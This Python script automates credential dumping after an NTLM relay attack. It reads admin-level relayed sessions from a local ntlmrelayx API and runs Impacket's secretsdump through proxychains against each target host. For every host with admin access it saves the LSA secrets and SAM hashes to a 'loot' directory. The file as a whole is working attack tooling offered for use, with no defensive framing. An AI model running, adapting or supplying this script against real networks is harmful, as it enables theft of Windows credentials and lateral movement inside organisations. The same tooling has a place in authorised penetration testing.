# this tool will dump all admin relays lsa secrets and sam
try:
    from urllib.request import ProxyHandler, build_opener, Request
except ImportError:
    from urllib2 import ProxyHandler, build_opener, Request

import os, sys, json
import concurrent.futures

color_RED = '\033[91m'
color_GRE = '\033[92m'
color_YELL = '\033[93m'
color_BLU = '\033[94m'
color_PURP = '\033[35m'
color_reset = '\033[0m'
green_plus = "{}[+]{}".format(color_GRE, color_reset)
red_minus = "{}[-]{}".format(color_RED, color_reset)
gold_plus = "{}[+]{}".format(color_YELL, color_reset)
red_exclm = "{}[!]{}".format(color_RED, color_reset)

cwd = os.path.abspath(os.path.dirname(__file__))
dumped_ips = []


def config_check():
    fail = 0
    sockfail = 0
    print('{}[{}Checking proxychains configs{}]{}'.format(color_BLU, color_reset, color_BLU, color_reset))
    try:
        with open('/etc/proxychains.conf', 'r') as f:
            dat = f.read()
            f.close()

        if dat.find('127.0.0.1 1080') == -1:
            sockfail += 1

    except FileNotFoundError as e:
        fail += 1

    try:
        with open('/etc/proxychains4.conf', 'r') as f:
            dat = f.read()
            f.close()

        if dat.find('127.0.0.1 1080') == -1:
            sockfail += 1

    except FileNotFoundError as e:
        fail += 1

    if fail == 2:
        print('{} ERROR you are missing proxychains config'.format(red_minus))
        sys.exit(1)

    if sockfail >= 1:
        print('{} ERROR you are missing "socks4  127.0.0.1 1080" in your proxychains config'.format(red_minus))
        sys.exit(1)


def mt_execute(username, ip):
    os.system('sudo proxychains python3 secretsdump.py {}:\'\'@{} -no-pass -outputfile \'{}/loot/{}\''.format(username, ip, cwd, ip))
    with open('dumped_ips', 'a') as f:
        f.write(ip + '\n')
        f.close()

if __name__ == '__main__':

    if os.geteuid() != 0:
        print("{} Must be run as sudo".format(red_exclm))
        sys.exit(1)

    if os.path.isdir(cwd + "/loot") == False:
        os.makedirs(cwd + "/loot")

    config_check()

    if os.path.isfile('secretsdump.py') == False:
        print('Missing secretsdump.py in current directory')
        sys.exit(1)

    if os.path.isfile('dumped_ips'):
        with open('dumped_ips', 'r') as f:
            dat = f.read()
            dumped_ips = dat.split('\n')

    headers = ["Protocol", "Target", "Username", "AdminStatus", "Port"]
    url = "http://localhost:9090/ntlmrelayx/api/v1.0/relays"
    try:
        proxy_handler = ProxyHandler({})
        opener = build_opener(proxy_handler)
        response = Request(url)
        r = opener.open(response)
        result = r.read()

        items = json.loads(result)
    except Exception as e:
        print("ERROR: %s" % str(e))
    else:
        if len(items) > 0:

            tmp = result.decode()
            tmp = tmp.replace('[', '')
            tmp = tmp.replace('"', '')
            tmp = tmp.replace('\n', '')
            tmp = tmp.split('],')

            # dat[0] = protocol dat[1] = ip dat[2] = domain/username dat[3] = adminstatus

            if os.path.isdir(cwd + "/loot") == False:
                os.makedirs(cwd + "/loot")
            with concurrent.futures.ProcessPoolExecutor(max_workers=5) as executor: # multithreading yeahhhh
                for item in tmp:
                    dat = item.replace(']', '').split(',')
                    if dat[3] == 'TRUE':
                        if dat[1] not in dumped_ips:
                            dumped_ips.append(dat[1])  # append the ip to dumped_ips to avoid dumping the same host twice

                            # lsa secrets and sam dump courtesy of secretsdump
                            try:
                                executor.submit(mt_execute, dat[2], dat[1])
                            except Exception as e:
                                print(str(e))
                                print('Error dumping secrets')
                                continue


        else:
            print('No Relays Available!')
